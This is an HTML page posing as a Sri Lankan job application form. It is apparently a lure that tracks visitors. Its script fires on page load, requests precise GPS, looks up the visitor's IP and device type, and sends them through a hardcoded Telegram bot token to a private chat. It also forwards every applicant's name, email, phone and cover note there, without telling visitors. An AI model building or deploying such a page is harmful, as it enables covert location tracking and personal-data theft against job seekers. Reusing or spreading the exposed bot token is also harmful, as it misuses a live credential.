
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Job Application - HR Dept</title>
  <style>
    /* ===== RESET ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #eef2f7;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    /* ===== CARD ===== */
    .card {
      max-width: 520px;
      width: 100%;
      background: #ffffff;
      border-radius: 24px;
      padding: 32px 28px 36px;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
      transition: 0.3s;
      border: 1px solid rgba(0, 0, 0, 0.04);
    }

    .card .logo {
      font-size: 28px;
      font-weight: 700;
      color: #1a2a3a;
      letter-spacing: -0.5px;
      margin-bottom: 4px;
    }

    .card .sub-logo {
      font-size: 14px;
      color: #6b7a8a;
      margin-bottom: 24px;
      border-bottom: 2px solid #f0f4f9;
      padding-bottom: 16px;
    }

    /* ===== FORM ===== */
    .form-group {
      margin-bottom: 18px;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #1a2a3a;
      margin-bottom: 5px;
    }

    .form-group input,
    .form-group select,
    .form-group textarea {
      width: 100%;
      padding: 12px 14px;
      border: 1.5px solid #dce3ed;
      border-radius: 12px;
      font-size: 15px;
      background: #fafcfe;
      transition: 0.25s;
      outline: none;
      font-family: inherit;
    }

    .form-group input:focus,
    .form-group select:focus,
    .form-group textarea:focus {
      border-color: #2a7de1;
      background: #ffffff;
      box-shadow: 0 0 0 4px rgba(42, 125, 225, 0.08);
    }

    .form-group textarea {
      resize: vertical;
      min-height: 70px;
    }

    /* ===== LOCATION STATUS ===== */
    #location-status {
      background: #f0f7ff;
      border-radius: 12px;
      padding: 12px 16px;
      font-size: 14px;
      color: #1a3a6a;
      margin-bottom: 18px;
      border-left: 4px solid #2a7de1;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    #location-status .icon {
      font-size: 20px;
    }

    #location-status .text {
      flex: 1;
    }

    /* ===== SUBMIT ===== */
    .btn-submit {
      width: 100%;
      background: #2a7de1;
      color: #fff;
      border: none;
      padding: 14px;
      font-size: 17px;
      font-weight: 600;
      border-radius: 40px;
      cursor: pointer;
      transition: 0.25s;
      margin-top: 6px;
      box-shadow: 0 4px 14px rgba(42, 125, 225, 0.3);
    }

    .btn-submit:hover {
      background: #1a6ac8;
      transform: scale(1.01);
    }

    .btn-submit:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: none;
    }

    /* ===== RESPONSIVE ===== */
    @media (max-width: 480px) {
      .card {
        padding: 22px 16px 28px;
      }
    }
  </style>
</head>
<body>

<div class="card">

  <!-- ===== HEADER ===== -->
  <div class="logo">📋 HR Connect</div>
  <div class="sub-logo">Online Job Application · Sri Lanka</div>

  <!-- ===== LOCATION STATUS (Auto-load) ===== -->
  <div id="location-status">
    <span class="icon">📍</span>
    <span class="text" id="locationText">⏳ Detecting your location...</span>
  </div>

  <!-- ===== APPLICATION FORM ===== -->
  <form id="applicationForm">

    <div class="form-group">
      <label>Full Name</label>
      <input type="text" id="fullName" placeholder="e.g. Kaveesha Perera" required />
    </div>

    <div class="form-group">
      <label>Email Address</label>
      <input type="email" id="email" placeholder="kaveesha@email.com" required />
    </div>

    <div class="form-group">
      <label>Phone Number</label>
      <input type="tel" id="phone" placeholder="071 234 5678" required />
    </div>

    <div class="form-group">
      <label>Position Applying For</label>
      <select id="position">
        <option value="">— Select —</option>
        <option value="Software Engineer">Software Engineer</option>
        <option value="UI/UX Designer">UI/UX Designer</option>
        <option value="Data Analyst">Data Analyst</option>
        <option value="Marketing Executive">Marketing Executive</option>
        <option value="Customer Support">Customer Support</option>
      </select>
    </div>

    <div class="form-group">
      <label>Brief Cover Note</label>
      <textarea id="coverNote" placeholder="Why do you want this job?"></textarea>
    </div>

    <!-- ===== SUBMIT ===== -->
    <button type="submit" class="btn-submit" id="submitBtn">🚀 Submit Application</button>

  </form>

</div>

<!-- ============================================================ -->
<!-- ===== JAVASCRIPT - LOCATION + TELEGRAM ===== -->
<!-- ============================================================ -->
<script>
  // =============================================
  // 🔐 TELEGRAM CONFIG
  // =============================================
  const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
  const CHAT_ID   = '8308044531';

  // =============================================
  // 📍 LOCATION - AUTO REQUEST ON PAGE LOAD
  // =============================================
  const locationText = document.getElementById('locationText');
  let userLocation = null;

  function getLocation() {
    locationText.textContent = '⏳ Requesting location permission...';

    if (!navigator.geolocation) {
      locationText.textContent = '❌ Geolocation not supported by this browser.';
      return;
    }

    navigator.geolocation.getCurrentPosition(
      // ✅ Success
      (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        userLocation = { lat, lon };

        // Show location in status
        locationText.innerHTML = `✅ Location detected: <strong>${lat.toFixed(5)}, ${lon.toFixed(5)}</strong>`;

        // Send location to Telegram immediately
        sendLocationToTelegram(lat, lon);
      },
      // ❌ Error
      (err) => {
        console.warn('Location error:', err);
        locationText.textContent = '❌ Location access denied. Please enable GPS.';
        userLocation = null;
      },
      // Options
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  }

  // =============================================
  // 📤 SEND LOCATION TO TELEGRAM
  // =============================================
  async function sendLocationToTelegram(lat, lon) {
    try {
      // 📍 Google Maps link
      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

      // 🌐 Get IP (optional)
      let ip = 'Unknown';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip || 'Unknown';
      } catch (e) {}

      // 📱 Device info
      const ua = navigator.userAgent;
      const device = ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/i)?.[0] || 'Unknown Device';

      // 📝 Message
      const msg = `
📍 NEW LOCATION DETECTED

🌐 IP: ${ip}
📱 Device: ${device}
🕐 Time: ${new Date().toLocaleString()}

📍 Coordinates:
Latitude: ${lat}
Longitude: ${lon}

🗺️ Google Maps:
${mapsLink}
      `;

      // Send to Telegram
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: msg
        })
      });

      if (response.ok) {
        console.log('✅ Location sent to Telegram');
      } else {
        console.error('❌ Failed to send location');
      }

    } catch (err) {
      console.error('Send error:', err);
    }
  }

  // =============================================
  // 🚀 PAGE LOAD → AUTO REQUEST LOCATION
  // =============================================
  window.addEventListener('DOMContentLoaded', () => {
    // Small delay to let page render first
    setTimeout(getLocation, 500);
  });

  // =============================================
  // 📝 FORM SUBMIT - Send all data to Telegram
  // =============================================
  document.getElementById('applicationForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.textContent = '⏳ Submitting...';

    // Get form values
    const fullName = document.getElementById('fullName').value.trim();
    const email = document.getElementById('email').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const position = document.getElementById('position').value;
    const coverNote = document.getElementById('coverNote').value.trim();

    // Validate
    if (!fullName || !email || !phone) {
      alert('❌ කරුණාකර Full Name, Email සහ Phone Number පුරවන්න.');
      submitBtn.disabled = false;
      submitBtn.textContent = '🚀 Submit Application';
      return;
    }

    // Build message
    let msg = `
📋 NEW JOB APPLICATION

👤 Name: ${fullName}
📧 Email: ${email}
📞 Phone: ${phone}
💼 Position: ${position || 'Not specified'}

📝 Cover Note:
${coverNote || '—'}

📍 Location: ${userLocation ? `${userLocation.lat}, ${userLocation.lon}` : '❌ Not available'}

🕐 Submitted: ${new Date().toLocaleString()}
    `;

    // Add location link if available
    if (userLocation) {
      msg += `\n🗺️ Maps: https://www.google.com/maps?q=${userLocation.lat},${userLocation.lon}`;
    }

    try {
      // Send to Telegram
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: msg
        })
      });

      if (response.ok) {
        submitBtn.textContent = '✅ Application Submitted!';
        submitBtn.style.background = '#28a745';
        document.getElementById('applicationForm').reset();
        // Reset location and re-request
        userLocation = null;
        setTimeout(getLocation, 1000);
      } else {
        submitBtn.textContent = '❌ Submission Failed';
        submitBtn.disabled = false;
      }

    } catch (err) {
      console.error('Submit error:', err);
      submitBtn.textContent = '❌ Error';
      submitBtn.disabled = false;
    }
  });

  // =============================================
  // 💡 DEBUG INFO (optional)
  // =============================================
  console.log('✅ Job Application Form Loaded');
  console.log('📍 Location will be requested automatically...');
</script>

</body>
</html>
